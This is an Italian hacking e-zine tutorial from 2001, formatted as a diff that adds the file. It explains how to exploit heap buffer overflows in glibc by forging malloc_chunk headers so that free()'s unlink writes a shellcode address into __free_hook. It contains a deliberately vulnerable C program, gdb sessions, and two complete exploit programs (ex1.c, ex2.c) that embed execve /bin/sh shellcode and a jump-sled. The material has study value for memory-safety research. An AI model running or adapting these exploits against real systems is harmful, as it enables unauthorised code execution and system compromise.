@@ -1,0 +1,398 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 10 di 18 ]-------------
+==============================================================================
+
+-[ HACKING ]------------------------------------------------------------------
+---[ SPL0iTTARE GLi 0VERFL0W NELL'HEAP S0VRASCRiVEND0 LE STRUCT
+-----[ |CyRaX| <cyrax@pkcrew.org> - http://www.pkcrew.org
+
+
+Greets: tutti i pkc, nobody88, b_berry, bikappa, smav, vecna, fusys, marra
+        e tutti gli altri
+
+KOTD (kazzata of the day): minkiaaa !!!! domani e' san valentino. Uhmmm mi
+                           regalero' un paio di guanti
+
+PREMESSA: questa tecnica non e' stata scoperta da me. da quel ke no so e'
+          stata usata per la prima volta nell'exploit per il traceroute.. e
+          poi in seguito nell'exploit dello slocate. (in quei casi non si
+          trattava propriamente di un overflow.. ma comunque si potevano
+          sovrascrivere le struct). In ogni caso in giro non si trovano ankora
+	  dei tutorial completi sull'argomento. Personalmente ho imparato
+	  leggendo le advisory di MasterSecurity (ke cmq davano una
+	  spiegazione un po' troppo relativa al programma in particolare.. ke
+	  in generale) e bestemmiandoci sopra. In questo articolo troverete 
+	  anke delle mie aggiunte (come ad esempio l'uso dei jump al posto dei 
+	  nop). 
+
+Allora. In questo articolo cerchero' di spiegarvi come exploittare gli overflow
+di buffer ke non si trovano nello stack, bensi' nell'heap.
+L'heap e' quella zona di memoria di un processo dove si trovano i buffer
+allocati dinamicamente con la malloc().
+Beh, qual e' la differenza con i normali overflow nello stack ? semplice..
+nell'heap non ci sono indirizzi di ritorno ke potete cerkare di sovrascrivere.
+Nella maggior parte delle implementazioni della malloc() si trovano pero' tra 
+un buffer e l'altro delle strutture ke servono alle funzioncine ke agiscono 
+sull'heap a sapere le dimensioni dei vari buffer.
+Vediamo intanto un esempio di programma vulnerabile :
+
+<-| heap-bof/vuln1.c |->
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc,char **argv){
+   char *buf1,*buf2;
+   buf1=malloc(1000);
+   buf2=malloc(100);
+   strcpy(buf1,argv[1]);
+   free(buf1);
+   free(buf2);
+}
+<-X->
+
+Come vedete allochiamo due buffer.. e possiamo overfloware il primo passando 
++ di 1000 byte all'argomento del programma. Proviamo :
+
+c500:~/bfi$ gdb vuln1
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) run `perl -e "print 'A' x 1020"`
+Starting program: /home/cyrax/bfi/vuln1 `perl -e "print 'A' x 1020"`
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x40071361 in free () from /lib/libc.so.6
+(gdb)
+
+Tadaa.. segfault della free(). Questo xke' abbiamo sovrascritto la struttura
+ke si trova prima di buf2.. riempiendo di A il suo campo size.
+Guardiamo ora come e' fatta questa struttura:
+
+   struct malloc_chunk{
+      unsigned int ps; /* Previous size */
+      unsigned int sz;  /* size */
+      struct malloc_chunk *fd; /* puntatore alla prossima struttura */
+      struct malloc_chunk *bk; /* puntatore alla struttura precedente */
+   };
+
+Questa struttura puo' essere usata per identificare due tipi di chunk.
+Quelli usati e quelli liberi. 
+Nel caso la struttura rappresenti un chunk usato contiene solo il campo size.
+Ke e' posizionato esattamente 4 byte prima del buffer restituitoci dalla
+malloc. Per farvi capire meglio ekkovi due righe di codice ke allocano un
+buffer e ci mostrano il suo campo size.
+
+<-| heap-bof/sz.c |->
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc,char **argv){
+   char *buf;
+   unsigned int sz;
+   buf=(char *)malloc(100);
+   sz=*(buf-4);
+   printf("il mio campo size e' settato a %i\n",sz);
+}
+<-X->
+
+eseguiamolo :
+
+c500:~/bfi$ ./sz
+il mio campo size e' settato a 105
+c500:~/bfi$
+
+Come vedete solitamente viene settato nel campo size la quantita' di memoria
+ke rikiediamo + 5. (questo xke' una parte della size e' tenuta per la struttura)
+
+La struttura malloc_chunk puo' essere utilizzata anke per indicare un chunk
+libero. In tal caso :
+a) il campo size e' settato a 0 (o un equivalente 0xffffffff)
+b) il campo prev_size e' uguale alla dimensione del chunk precedente (non ci
+   importa molto.. ci basta sapere ke questo non dobbiamo settarlo a 0)
+c) il campo bk contiene l'indirizzo della struttura malloc_chunk ke indica
+   un chunk libero precedente
+d) il campo fd contiene l'indirizzo della struttura malloc_chunk ke indica
+   un chunk libero successivo.
+   
+Bene.. quando prima abbiamo overflowato buf1 abbiamo colpito la struttura
+malloc_chunk di buf2 (ke si trova subito prima). Quella struttura indica
+un chunk utilizzato.. e quindi contiene il solo campo size, ma grazie
+all'overflow possiamo trasformarla in una struttura per un chunk libero. 
+A cosa puo' servirci tutto cio' ?
+Dando un'okkiata al codice della free() nelle glibc.. notiamo ke
+su un chunk libero viene usata la macro unlink() :
+
+#define unlink(P, BK, FD)                                              \
+{                                                                      \
+        BK = P->bk;                                                    \
+        FD = P->fd;                                                    \
+        FD->bk = BK;                                                   \
+        BK->fd = FD;                                                   \
+}
+
+Allora.. ragioniamoci. Alla unlink vengono passati
+P: la struttura ke deve essere slinkata
+BK e FD: questi vengono usati dalla unlink per segnarsi alkuni indirizzi..
+         non dobbiamo passargli nulla.
+	 
+Cosa fa questa unlink ?
+- allora.. si segna in BK l'indirizzo puntato dal campo bk della struttura da
+  slinkare.
+- si segna in FD l'indirizzo puntato dal campo fd della struttura da slinkare
+- scrive nel campo bk della struttura puntata da FD l'indirizzo puntato dal
+  campo bk della struttura da slinkare
+- scrive nel campo fd della struttura puntata da BK l'indirizzo puntato dal
+  campo fd della struttura da slinkare..
+  
+Non ci avete capito una pippa ? Provo a spiegarmi n'attimo meglio..
+Come spero avrete capito le strutture ke indicano chunk liberi sono linkate
+tra di loro in una lista circolare. Questo significa ke ogni struttura contiene
+un puntatore alla struttura ke si trova prima e dopo di essa.
+La unlink non fa ke eliminare una struttura da questo cerchio. Prima di poter
+rimuovere di brutto una struttura da un lista circolare.. dobbiamo fare in
+modo ke l'elemento ke si trova dopo la struttura da eliminare riconosca come
+elemento precedente quello ke si trova prima della struttura da eliminare...
+e fare in modo ke quello ke si trovi prima riconosca come struttura successiva
+quella ke si trova dopo. (scusate il casino... ho perso il vocabolario dei 
+sinonimi e dei contrari)
+
+Non avete capito ankora cosa fa l'unlink() ?!?!?!
+Alloraaa...
+ci sono recidjvo, cyrax e asynchro ke fanno il trenino...
+a cyrax duole il culetto e vuole unlinkarsi!
+Ke fa allora ? 
+- Dice a recidivo "Ue'.. mi sono rotto.. ora ti inkuli asynchro".
+- Dice ad asynchro "Ora ti fai inkulare da recidjvo"
+Fatto questo puo' andarsene.. e il trenino e' ankora funzionante :)
+
+Bene bene.. se siete arrivati qui dovreste riuscire ad arrivare anke in
+fondo :)
+Come vi ho detto prima.. possiamo creare una struttura indicante un chunk
+libero al posto di un altra struttura ke andiamo a sovrascrivere.. e fare in
+modo ke la successiva free() ci esegua una unlink.
+
+Bene.. potendo controllare i puntatori fd e bk della struttura.. possiamo
+far scrivere alla unlink() cio' ke vogliamo in memoria.
+
+Prima di procedere.. dobbiamo trovare un bersaglio.
+Nei format bug o negli overflow di stack si usano solitamente gli indirizzi
+di ritorno di qualke funzione.
+In questo caso ci conviene usare invece un puntatore a funzione chiamato
+__free_hook. All'avvio del programma contiene NULL. Ogni volta ke la funzione
+free() viene eseguita controlla se il __free_hook e' diverso da NULL e in
+tal caso esegue la funzione da lui puntata al posto di proseguire. Lo scopo
+di questo puntatore e' dare la possibilita' agli utenti di usare una proprio
+implementazione di free(). (c'e' un hook per ogni funzione ke gestisce l'heap
+quindi anke __malloc_hook e __realloc_hook)
+Ecco come prendere il suo indirizzo:
+
+c500:~/bfi$ gdb vuln1
+[..]
+(gdb) break main
+Breakpoint 1 at 0x8048422
+(gdb) run
+Breakpoint 1, 0x8048422 in main ()
+(gdb) x &__free_hook
+0x400fc994 <__free_hook>:       0x00000000
+
+Bene.. la free_hook sta a 0x400fc994
+
+Dobbiamo procurarci poi l'indirizzo del buffer con cui andiamo a fare 
+l'overflow. Il nostro scopo finale sara' scrivere nel __free_hook il suo
+indirizzo. Ovviamente in quel buffer piazzeremo un bello shellcode pronto a
+darci accesso :)
+
+Allora.. ekko come deve diventare la struttura di buf2:
+
+previous_size : 0xfffffffe
+size : 0xffffffff
+forward : <indirizzo shellcode>
+back : <indirizzo __free_hook> -8
+
+allora.. prev_size lo mettiamo a qualsiasi cosa diversa da 0
+
+size lo mettiamo a 0xffffffff.. questo per fare in modo ke la struttura
+rappresenti un chunk libero.
+
+in back mettiamo l'indirizzo del free_hook -8. Xke' proprio -8 ?
+La unlink trattera' l'indirizzo ke mettiamo in back come una struttura e
+mettera' nel campo fd quello ke noi mettiamo nel campo forward della nostra.
+(l'indirizzo dello shellcode). Beh.. noi vogliamo ke l'indirizzo dello
+shellcode capiti giusto all'indirizzo del free_hook. Prima del campo fd in
+una struttura ci sono 8 byte (4 di prev_size e 4 di size). Quindi sottraendo 8
+__free_hook e fd combacieranno perfettamente...
+
+in forward mettiamo ovviamente l'indirizzo dello shellcode....
+
+Bene.. ci siamo quasi (tutti in coro: era oraaa)
+Manca un ultima considerazione sullo shellcode. La unlink trattera' lo
+shellcode come una struttura... e modifikera' il suo campo back mettendoci
+l'indirizzo della __free_hook. Ovviamente noi non vogliamo ke questo
+indirizzo sovrascriva alkune istruzioni importanti dello shellcode con qualke
+istruzione illegale.
+Per ovviare al problema bastera' fare una piccola modifica agli shellcode
+tradizionali.. aggiungendo un semplice :
+"\xeb\x0f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+all'inizio..
+questa riga fa in modo ke il programma salti la parte ke viene sovrascritta
+dalla unlink();
+
+E oraaaa... si comincia a sploitttare vuln1.c :))
+
+abbiamo gia' stabilito ke l'indirizzo della free_hook e' 0x400fc994
+ora troviamo l'indirizzo del buffer:
+come fare ? beh.. disassembliamo la main e brekkiamo subito dopo la malloc()
+poi guardiamo i registri e in %eax troveremo cio' ke la malloc ha restituito 
+(il nostro bufferone :)
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x804841c <main>:       push   %ebp
+0x804841d <main+1>:     mov    %esp,%ebp
+0x804841f <main+3>:     sub    $0x8,%esp
+0x8048422 <main+6>:     push   $0x3e8
+0x8048427 <main+11>:    call   0x8048330 <malloc>
+0x804842c <main+16>:    add    $0x4,%esp
+0x804842f <main+19>:    mov    %eax,%eax
+[...]
+(gdb) break *0x804842c
+Breakpoint 1 at 0x804842c
+(gdb) run
+Breakpoint 1, 0x804842c in main ()
+(gdb) info registers
+eax            0x8049760        134518624
+ecx            0x400fc520       1074775328
+edx            0x4b9    1209
+[...]
+
+Bene bene.. 0x8049760 e' l'indirizzo di buf1.
+
+perfetto.. ora calcoliamo un po' dove dovremo cominciare a scrivere il chunk...
+allora.. vengono allocati 1000 byte dopo i quali cominciera' la struct
+riempiremo il nostro buffer di 1000 byte di roba (tra cui lo shellcode)
+dopodike' copieremo la struttura ke avremo costruito..
+la prima free() kiamata andra' quindi a scrivere cio' ke vogliamo nel
+free_hook.. e la free() successiva eseguira' lo shellcode..
+
+lo shellcode non lo posizioniamo all'inizio del buffer.. xke' la free()
+potrebbe sovrascrivere altri pezzi importanti.. ci basta spostarlo 20 byte
+piu' in la xke' funzioni
+
+ed ekkovelo qui..
+l'ho provato sulla mia slakka 7.0..
+al 99% sulla vostra box non funzionera' :P
+(ma bastera' cambiargli l'indirizzo del freehook e del buffer)
+
+<-| heap-bof/ex1.c |->
+#include <stdio.h>
+#include <stdlib.h>
+
+#define FREE_HOOK 0x400fc994
+#define BUFF 0x8049760
+
+char shellcode[] =
+        "\xeb\x0f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90"
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+int main(int argc,char **argv){
+   char buff[1100];
+   char *ex[5];
+   struct malloc_chunk{
+      unsigned int ps;
+      unsigned int sz;
+      struct malloc_chunk *fd;
+      struct malloc_chunk *bk;
+   } mc;
+   mc.ps=0xfffffffe;
+   mc.sz=0xffffffff;
+   mc.bk=FREE_HOOK-8;
+   mc.fd=BUFF+20;
+   memset(buff,'A',1000);
+   memcpy(buff+20,shellcode,sizeof(shellcode)-1);
+   memcpy(buff+1000,&mc,sizeof(mc));
+   buff[1000+sizeof(mc)]=0;
+   ex[0]="./vuln1";
+   ex[1]=buff;
+   ex[2]=NULL;
+   execv(ex[0],ex);   
+}
+<-X->
+
+Ma non e' finita qua ! :)
+Come avrete notato.. per esploittare tutto cio' dobbiamo indovinare come
+minimo due variabili. Il free_hook e l'indirizzo dello shellcode. Perke' non
+possiamo usare i nop come tutti i normali stack overflow ?! Beh... la unlink()
+"sporca" qualke byte dopo quelli ke gli passiamo.. quindi anke se
+centrassimo un nop il programma scorrerebbe fino a bekkare un illegal
+instruction.
+Possiamo comunque ovviare al problema usando dei "\eb\x0f" al posto dei nop.
+Questa istruzione (ke abbiamo anke aggiunto prima allo shellcode) non fa ke
+saltare 0xf byte piu' avanti. Riempiendolo di questi jump.. nel caso ke il
+programma salti su uno di essi andrebbe avanti fino ad atterrare sui nop
+prima dello shellcode. Ed ekkovi ex2.c ke utilizza questa tecnica :)
+
+<-| heap-bof/ex2.c |->
+#include <stdio.h>
+#include <stdlib.h>
+
+#define FREE_HOOK 0x400fc994
+#define BUFF 0x8049760
+
+char shellcode[] =
+        "\xeb\x0f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90"
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc,char **argv){
+   char buff[1100];
+   char *ex[5];
+   struct malloc_chunk{
+      unsigned int ps;
+      unsigned int sz;
+      struct malloc_chunk *fd;
+      struct malloc_chunk *bk;
+   } mc;
+   int i;
+   mc.ps=0xfffffffe;
+   mc.sz=0xffffffff;
+   mc.bk=FREE_HOOK-8;
+   mc.fd=BUFF+400;
+   memset(buff,'A',1100);
+   for(i=0;i<900;i+=2)
+     memcpy(buff+i,"\xeb\x0f",2);
+   memcpy(buff+i,shellcode,sizeof(shellcode)-1);
+   memcpy(buff+1000,&mc,sizeof(mc));
+   buff[1000+sizeof(mc)]=0;
+   ex[0]="./vuln1";
+   ex[1]=buff;
+   ex[2]=NULL;
+   execv(ex[0],ex);   
+}
+<-X->
+
+Oky.. direi ke e' tutto :)
+Mandate pure commenti,domane, insulti.. foto di vostra sorella a
+cyrax@pkcrew.org
+
+(E ricordatevi di checkare www.pkcrew.org di tanto in tanto :PP)
+
+
+==============================================================================
+--------------------------------[ EOF 10/18 ]---------------------------------
+==============================================================================
+
